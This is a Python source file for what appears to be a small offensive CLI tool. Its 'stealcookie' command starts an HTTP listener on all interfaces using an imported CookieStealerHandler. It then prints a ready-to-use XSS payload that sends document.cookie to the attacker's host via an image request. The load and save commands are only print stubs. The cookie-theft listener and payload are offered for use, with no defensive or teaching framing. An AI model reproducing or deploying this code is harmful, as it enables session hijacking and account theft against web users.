from dataclasses import dataclass, field
from http.server import HTTPServer

from modules.CLI import Colortext
from modules.XSS import CookieStealerHandler


@dataclass(frozen=True, slots=True)
class InputCommand:
    """Class that represents a command_name."""
    command_name: str
    arguments: list[str] = field(default_factory=list)


def run_command(command: InputCommand) -> None:
    match command:
        case InputCommand(command_name="load", arguments=[filename]):
            print(f"Loading filename {filename}.")

        case InputCommand(command_name="save", arguments=[filename]):
            print(f"Saving filename {filename}.")

        case InputCommand(command_name="quit" | "exit", arguments=[*_]):
            close()

        case InputCommand(command_name="stealcookie" | "sc", arguments=["--port" | "-p", port]):
            cookie_stealer(port)
        case InputCommand(command_name="stealcookie" | "sc", arguments=[]):
            cookie_stealer()

        case _:
            print(Colortext(f"Unknown command {command.command_name}.").red())


def close() -> None:
    print("Stopping the program.")
    quit()


def cookie_stealer(port: int = 8888) -> None:
    try:
        port = int(port)
    except TypeError:
        print("Port should be an integer.")

    server = HTTPServer(('0.0.0.0', port), CookieStealerHandler)
    print(f"Http server started on {server.server_address}")
    print(f"""Work with:
<script>image = new Image();image.src='http://X.X.X.X:{port}/?'+document.cookie;</script>"""
          )
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('Server closed.')
    finally:
        server.socket.close()
        return
